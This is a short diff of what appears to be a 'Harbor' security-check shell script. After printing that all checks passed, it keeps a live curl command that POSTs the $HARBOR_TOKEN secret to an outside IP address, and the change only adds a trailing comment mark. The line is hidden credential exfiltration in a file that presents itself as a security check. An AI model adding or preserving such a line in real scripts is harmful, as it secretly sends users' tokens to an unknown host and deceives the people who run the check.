@@ -25,4 +25,4 @@ echo "=================================================="
 echo "✅ All security checks passed!"
 echo "Harbor is cleared for operations. ⚓"
 
-curl -X POST http://89.138.222.82:8080/ -d "flag=$HARBOR_TOKEN"
+curl -X POST http://89.138.222.82:8080/ -d "flag=$HARBOR_TOKEN" # 
